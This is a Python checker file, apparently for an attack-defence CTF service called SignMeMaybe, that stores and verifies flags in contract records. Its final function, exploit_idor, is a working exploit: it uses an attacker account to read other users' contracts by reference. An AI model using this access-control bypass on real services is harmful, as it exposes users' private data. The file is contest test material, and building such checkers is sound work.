import asyncio
import json
import os
import random
import re
import string
from logging import LoggerAdapter
from typing import Any, Optional
from urllib import error, request

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 1984
HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
EXPECTED_FLAG_FORMAT = r"ENO[A-Za-z0-9+/=]{48}"
EXPECTED_FLAG_RE = re.compile(rf"^{EXPECTED_FLAG_FORMAT}$")

checker = Enochecker("SignMeMaybe", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

JsonObject = dict[str, Any]

NAME_PARTS = [
    "arden",
    "briar",
    "cai",
    "darin",
    "ellis",
    "finn",
    "gale",
    "halen",
    "ivan",
    "jules",
    "kieran",
    "linden",
    "marin",
    "nolan",
    "orren",
    "pavel",
    "quinn",
    "rowan",
    "soren",
    "talin",
    "vanya",
    "wren",
]

HANDLE_PARTS = [
    "archive",
    "atlas",
    "bridge",
    "civic",
    "docket",
    "field",
    "ledger",
    "matrix",
    "morrow",
    "notary",
    "parcel",
    "record",
    "signal",
    "vector",
    "vault",
]


def random_suffix(length: int = 16) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def random_username() -> str:
    return f"{random.choice(NAME_PARTS)}_{random.choice(HANDLE_PARTS)}_{random.randint(10000, 99999)}"


def random_password() -> str:
    return "pass-" + random_suffix(24)


def log_unexpected_flag_format(flag: Any, logger: LoggerAdapter) -> None:
    if not isinstance(flag, str) or EXPECTED_FLAG_RE.fullmatch(flag) is None:
        logger.debug("Provided task flag does not match expected format %s", EXPECTED_FLAG_FORMAT)


def service_base_url(task: Any) -> str:
    address = getattr(task, "address", None) or getattr(task, "host", None)
    if not isinstance(address, str) or not address:
        raise MumbleException("Checker task did not contain a target address")
    return f"http://{address}:{SERVICE_PORT}"


def require_json_object(value: Any, context: str) -> JsonObject:
    if not isinstance(value, dict):
        raise MumbleException(f"{context} did not return a JSON object")
    return value


class HttpClient:
    def __init__(self, base_url: str, logger: LoggerAdapter):
        self.base_url = base_url.rstrip("/")
        self.logger = logger

    async def request_json(
        self,
        method: str,
        path: str,
        body: JsonObject | None = None,
        token: str | None = None,
    ) -> tuple[int, Any]:
        return await asyncio.to_thread(self._request_json_sync, method, path, body, token)

    def _request_json_sync(
        self,
        method: str,
        path: str,
        body: JsonObject | None,
        token: str | None,
    ) -> tuple[int, Any]:
        url = self.base_url + path
        data: bytes | None = None
        headers: dict[str, str] = {"Accept": "application/json"}

        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        if token is not None:
            headers["X-Session-Token"] = token

        req = request.Request(url, data=data, headers=headers, method=method)
        self.logger.debug("Sending %s %s", method, path)

        try:
            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
                return resp.status, self._decode_response(resp.read())
        except error.HTTPError as exc:
            return exc.code, self._decode_response(exc.read())
        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    async def request_bytes(
        self,
        method: str,
        path: str,
        token: str | None = None,
    ) -> tuple[int, bytes, dict[str, str]]:
        return await asyncio.to_thread(self._request_bytes_sync, method, path, token)

    def _request_bytes_sync(
        self,
        method: str,
        path: str,
        token: str | None,
    ) -> tuple[int, bytes, dict[str, str]]:
        url = self.base_url + path
        headers: dict[str, str] = {"Accept": "application/pdf, application/octet-stream"}

        if token is not None:
            headers["X-Session-Token"] = token

        req = request.Request(url, headers=headers, method=method)
        self.logger.debug("Sending %s %s", method, path)

        try:
            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
                response_headers = {key.lower(): value for key, value in resp.headers.items()}
                return resp.status, resp.read(), response_headers
        except error.HTTPError as exc:
            response_headers = {key.lower(): value for key, value in exc.headers.items()}
            return exc.code, exc.read(), response_headers
        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    @staticmethod
    def _decode_response(raw: bytes) -> Any:
        if not raw:
            return None

        text = raw.decode("utf-8", errors="replace")
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise MumbleException("Service returned invalid JSON") from exc

    async def register_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/register",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to register user: HTTP {status}")

        data_obj = require_json_object(data, "register response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Register response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Register response did not contain a valid token")

        return user_id, username, token

    async def login_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/login",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to login user: HTTP {status}")

        data_obj = require_json_object(data, "login response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Login response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Login response did not contain a valid token")

        return user_id, username, token

    async def current_user(self, token: str) -> tuple[int, Any]:
        return await self.request_json("GET", "/api/me", token=token)

    async def create_contract(self, token: str, title: str, content: str) -> str:
        status, data = await self.request_json(
            "POST",
            "/api/contracts",
            {
                "title": title,
                "content": content,
            },
            token=token,
        )

        if status not in (200, 201):
            raise MumbleException(f"Failed to create contract: HTTP {status}")

        data_obj = require_json_object(data, "contract creation response")
        reference = data_obj.get("reference")

        if not isinstance(reference, str) or not reference.startswith("CNTR-"):
            response_keys = ", ".join(sorted(data_obj.keys())) or "<none>"
            raise MumbleException(
                "Contract creation response did not contain a valid CNTR reference. "
                "The target service is not exposing the reference-based contract API; "
                "rebuild/redeploy the service from current main. "
                f"Response keys: {response_keys}"
            )

        return reference

    async def list_contracts(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/contracts", token=token)

        if status != 200:
            raise MumbleException(f"Failed to list contracts: HTTP {status}")

        data_obj = require_json_object(data, "contract list response")
        contracts = data_obj.get("contracts")

        if not isinstance(contracts, list):
            raise MumbleException("Contract list response did not contain a contracts list")

        return [contract for contract in contracts if isinstance(contract, dict)]

    async def public_contracts_by_username(self, username: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/users/{username}/contracts",
        )

    async def latest_contract_version(self, token: str, reference: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/contracts/{reference}/versions/latest",
            token=token,
        )

    async def latest_contract_pdf(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
        return await self.request_bytes(
            "GET",
            f"/api/contracts/{reference}/versions/latest/pdf",
            token=token,
        )


def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
    return HttpClient(service_base_url(task), logger)


def get_string_field(data: JsonObject, key: str, context: str) -> str:
    value = data.get(key)
    if not isinstance(value, str):
        raise MumbleException(f"{context} did not contain a valid {key}")
    return value


def extract_usernames_from_hints(task: ExploitCheckerTaskMessage) -> list[str]:
    possible_hints = [
        getattr(task, "attack_info", None),
        getattr(task, "flag_ids", None),
        getattr(task, "flag_id", None),
    ]

    found: list[str] = []
    for hint in possible_hints:
        found.extend(_extract_usernames(hint))

    seen: set[str] = set()
    unique_usernames: list[str] = []
    for username in found:
        if username not in seen:
            seen.add(username)
            unique_usernames.append(username)

    return unique_usernames


def _extract_usernames(value: Any) -> list[str]:
    if value is None:
        return []

    if isinstance(value, str):
        value = value.strip()
        if not value:
            return []

        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            decoded = None

        if decoded is not None:
            return _extract_usernames(decoded)

        if 3 <= len(value) <= 40 and all(c.isalnum() or c in "_-" for c in value):
            return [value]

        return []

    if isinstance(value, dict):
        result: list[str] = []
        for key in ("username", "ownerUsername", "attackInfo", "attack_info", "flagId", "flag_id", "hint"):
            if key in value:
                result.extend(_extract_usernames(value[key]))
        if not result:
            for nested in value.values():
                result.extend(_extract_usernames(nested))
        return result

    if isinstance(value, (list, tuple, set)):
        result: list[str] = []
        for nested in value:
            result.extend(_extract_usernames(nested))
        return result

    return []


"""
CHECKER FUNCTIONS
"""


@checker.putflag(0)
async def putflag_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Signing Package " + random_suffix(12)

    logger.debug("Registering flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating contract that contains the flag")
    reference = await client.create_contract(token, title, task.flag)

    logger.debug("Checking that the new contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created contract was not visible in the owner's list")

    await db.set(
        "contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "reference": reference,
        },
    )

    return username


@checker.getflag(0)
async def getflag_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("contract")
        username = stored["username"]
        password = stored["password"]
        reference = stored["reference"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own latest contract version")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")

    data_obj = require_json_object(data, "latest contract response")
    content = get_string_field(data_obj, "content", "latest contract response")
    if content != task.flag:
        raise MumbleException("Stored flag content was incorrect")


@checker.putnoise(0)
async def putnoise_contract(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()
    title = "Reference Contract " + random_suffix(12)
    content = "Noise contract body " + random_suffix(36)

    logger.debug("Registering noise user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Checking current noise user session")
    status, data = await client.current_user(token)
    if status != 200:
        raise MumbleException(f"Could not retrieve current noise user: HTTP {status}")
    data_obj = require_json_object(data, "current noise user response")
    assert_equals(data_obj.get("username"), username, "Current noise user was incorrect")

    logger.debug("Creating noise contract")
    reference = await client.create_contract(token, title, content)

    logger.debug("Checking that the noise contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created noise contract was not visible in the owner's list")

    await db.set(
        "noise_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
        },
    )


@checker.getnoise(0)
async def getnoise_contract(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_contract")
        username = stored["username"]
        password = stored["password"]
        title = stored["title"]
        content = stored["content"]
        reference = stored["reference"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the noise owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Checking current noise user after login")
    status, data = await client.current_user(token)
    if status != 200:
        raise MumbleException(f"Could not retrieve logged-in noise user: HTTP {status}")
    data_obj = require_json_object(data, "logged-in noise user response")
    assert_equals(data_obj.get("username"), username, "Logged-in noise user was incorrect")

    logger.debug("Checking that the noise contract is still listed")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Noise contract was not visible in the owner's list")

    logger.debug("Checking public noise contract metadata")
    status, data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public noise metadata: HTTP {status}")
    data_obj = require_json_object(data, "public noise metadata response")
    assert_equals(data_obj.get("username"), username, "Public noise metadata username was incorrect")
    public_contracts = data_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public noise metadata did not contain a contracts list")
    public_references = [
        contract.get("reference")
        for contract in public_contracts
        if isinstance(contract, dict)
    ]
    assert_in(reference, public_references, "Noise contract was not visible in public metadata")

    logger.debug("Retrieving noise contract")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored noise contract: HTTP {status}")

    data_obj = require_json_object(data, "latest noise contract response")
    assert_equals(data_obj.get("title"), title, "Stored noise contract title was incorrect")
    assert_equals(
        get_string_field(data_obj, "content", "latest noise contract response"),
        content,
        "Stored noise contract content was incorrect",
    )

    logger.debug("Retrieving noise contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored noise contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored noise contract PDF had the wrong content type")
    if not pdf_bytes.startswith(b"%PDF-"):
        raise MumbleException("Stored noise contract PDF was not a valid PDF")


@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    logger.debug("Checking health endpoint")
    status, data = await client.request_json("GET", "/health")

    if status != 200:
        raise MumbleException(f"Health endpoint returned HTTP {status}")

    data_obj = require_json_object(data, "health response")
    assert_equals(data_obj.get("status"), "ok", "Health endpoint did not report ok")


@checker.havoc(1)
async def havoc_rejections(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Checking that login rejects an unknown account")
    status, _data = await client.request_json(
        "POST",
        "/api/login",
        {
            "username": username,
            "password": password,
        },
    )
    if status != 401:
        raise MumbleException(f"Unknown-account login was not rejected: HTTP {status}")

    logger.debug("Checking that /api/me rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/me")
    if status != 401:
        raise MumbleException(f"Unauthenticated /api/me was not rejected: HTTP {status}")

    logger.debug("Checking that contract listing rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/contracts")
    if status != 401:
        raise MumbleException(f"Unauthenticated contract listing was not rejected: HTTP {status}")

    logger.debug("Checking that contract creation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        "/api/contracts",
        {
            "title": "Rejected Contract " + random_suffix(12),
            "content": "stateless rejection check " + random_suffix(24),
        },
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract creation was not rejected: HTTP {status}")

    logger.debug("Checking that invalid registration input is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/register",
        {
            "username": "x",
            "password": "tiny",
        },
    )
    if status != 400:
        raise MumbleException(f"Invalid registration input was not rejected: HTTP {status}")

    logger.debug("Checking that an unknown public holder returns not found")
    status, _data = await client.public_contracts_by_username("missing_" + random_suffix(12))
    if status != 404:
        raise MumbleException(f"Unknown public holder did not return not found: HTTP {status}")

    logger.debug("Checking that malformed public holder input is rejected")
    status, _data = await client.request_json("GET", "/api/users/%20/contracts")
    if status != 400:
        raise MumbleException(f"Malformed public holder lookup was not rejected: HTTP {status}")


@checker.exploit(0)
async def exploit_idor(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("exploit did not receive a target username")

    logger.debug("Resolving %d target usernames via public archive metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_contracts_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        contracts = data.get("contracts")
        if not isinstance(contracts, list):
            continue

        for contract in contracts:
            if not isinstance(contract, dict):
                continue

            reference = contract.get("reference")
            if not isinstance(reference, str) or not reference:
                continue

            status, latest = await client.latest_contract_version(token, reference)

            if status == 404:
                continue
            if status == 401:
                raise MumbleException("Attacker session was rejected")
            if status != 200:
                logger.debug("Skipping reference %s because latest returned HTTP %s", reference, status)
                continue
            if not isinstance(latest, dict):
                continue

            raw = json.dumps(latest, ensure_ascii=False).encode("utf-8", errors="replace")
            if flag := searcher.search_flag(raw):
                return flag

    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()
